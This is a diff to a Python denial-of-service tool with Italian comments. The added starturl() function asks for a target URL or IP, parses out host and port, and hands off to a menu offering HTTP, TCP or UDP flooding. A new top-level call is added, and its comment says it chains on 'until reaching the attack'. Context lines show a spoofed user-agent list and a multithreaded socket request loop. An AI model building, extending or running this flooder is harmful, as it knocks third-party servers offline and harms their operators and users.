@@ -71,6 +71,40 @@ def user_agent():
 	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
 	return(uagent)
 
+def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
+	global url
+	global url2
+	global urlport
+
+	url = input("\nInsert URL/IP: ")
+
+	if url == "":
+		print ("Please enter the url.")
+		starturl()
+
+	try:
+		if url[0]+url[1]+url[2]+url[3] == "www.":
+			url = "http://" + url
+		elif url[0]+url[1]+url[2]+url[3] == "http":
+			pass
+		else:
+			url = "http://" + url
+	except:
+		print("You mistyped, try again.")
+		starturl()
+
+	try:
+		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+	except:
+		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
+
+	try:
+		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
+	except:
+		urlport = "80"
+
+	floodmode()
+
 def floodmode():
 	global choice1
 	choice1 = input("Do you want to perform HTTP flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
@@ -625,6 +659,9 @@ class requestdefault(threading.Thread): # la classe del multithreading
 					s.close()
 			except: # se qualcosa va storto
 				s.close() # chiude socket e ricomincia
+
+starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
+
 				
 
 def my_bots():
